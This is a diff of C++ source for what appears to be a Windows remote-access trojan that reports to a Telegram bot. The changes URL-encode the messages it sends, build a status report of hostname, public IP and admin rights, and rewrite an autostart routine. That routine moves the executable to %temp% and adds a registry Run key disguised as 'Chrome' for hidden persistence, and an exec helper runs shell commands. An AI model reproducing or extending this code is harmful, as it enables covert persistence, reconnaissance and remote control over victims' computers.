@@ -8,6 +8,7 @@
 #include <atlimage.h>
 #include <winternl.h>
 #include <winsock.h>
+#include <iomanip>
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
 #pragma comment(lib, "Shlwapi.lib")
@@ -181,21 +182,32 @@ string get_path() {
     return buffer;
 }
 
-void autostart() {
-    if (!filexits("%temp%\\" + get_exe())) {
-        fstream file;
-        file.open("o.bat");
-        file << "TASKKILL /F /IM " << get_exe() << endl
-            << "mv " << get_exe() << "%temp%" << endl
-            << "start %temp%\\" + get_exe();
-        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d %temp%\\" + get_exe();
-        system(cmd.c_str());
-        system("o.bat");
+//https://stackoverflow.com/questions/154536/encode-decode-urls-in-c
+string url_encode(const string& value) {
+    ostringstream escaped;
+    escaped.fill('0');
+    escaped << hex;
+
+    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
+        string::value_type c = (*i);
+
+        // Keep alphanumeric and other accepted characters intact
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
+            escaped << c;
+            continue;
+        }
+
+        // Any other characters are percent-encoded
+        escaped << uppercase;
+        escaped << '%' << setw(2) << int((unsigned char)c);
+        escaped << nouppercase;
     }
+
+    return escaped.str();
 }
 
 void Send(string to_send) {
-    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + to_send});
+    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send)});
 }
 
 string exec(const char* cmd) {
@@ -242,21 +254,67 @@ Cleanup:
     return fIsElevated;
 }
 
-json getStatus() {
-    json status;
+string getStatus() {
+    string status;
 
     int uptime_h = (time(nullptr) - uptime_start)/CLOCKS_PER_SEC/3600;
     int uptime_m = ((time(nullptr) - uptime_start) / CLOCKS_PER_SEC)/60;
     uptime_m -= uptime_h * 60;
     if (uptime_m < 0)uptime_m = 0;
     
-    status["uptime"] = to_string(uptime_h) + "h" + to_string(uptime_m) + "m";
-    status["exe_name"] = get_exe();
+    status = "uptime: " + to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
+    status += "exe_name: " + get_exe() + '\n';
     string buffer = exec("hostname");
     buffer[buffer.size() - 1] = ' ';
-    status["host_name"] = buffer;
+    status += "host_name: " + buffer + '\n';
     auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
-    status["public_ip"] = response.text;
-    status["admin_rights"] = IsProcessElevated();
+    status += "public_ip: " + response.text + '\n';
+    status += "admin_rights: " + to_string(IsProcessElevated());
+    
+    cout << status << endl;
     return status;
+}
+
+void autostart() {
+    string path;
+    char username[256 + 1];
+    DWORD username_len = 256 + 1;
+    GetUserName(username, &username_len);
+
+    char letter[256 + 1];
+    GetSystemDirectory(letter, sizeof(letter));
+
+    path = letter[0];
+    path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
+    if (!filexits(path +"\\"+ get_exe())) {
+        fstream file;
+        file.open("o.bat", ios::out);
+        file << "TASKKILL /F /IM " << get_exe() << endl
+            << "move " << get_exe() << " %temp%" << endl
+            << "start %temp%\\" + get_exe();
+        file.close();
+        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d %temp%\\" + get_exe();
+        system(cmd.c_str());
+
+        char buffer[MAX_PATH];
+        ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
+        string buff2(buffer);
+        buff2.erase(get_exe().size() - get_exe().size(), 256);
+        cout << "jd";
+        cout << buff2;
+        file.open(path+"\\shitoo");
+        file << buff2 + "o.bat";
+        file.close();
+      //  system("o.bat");
+    }
+    if (filexits(path+"\\shitoo")) {
+        fstream file;
+        string path2;
+        file.open("shitoo");
+        file >> path2;
+        file.close();
+        path2 += "\\o.bat";
+        remove(path.c_str());
+        remove("shitoo");
+    }
 }
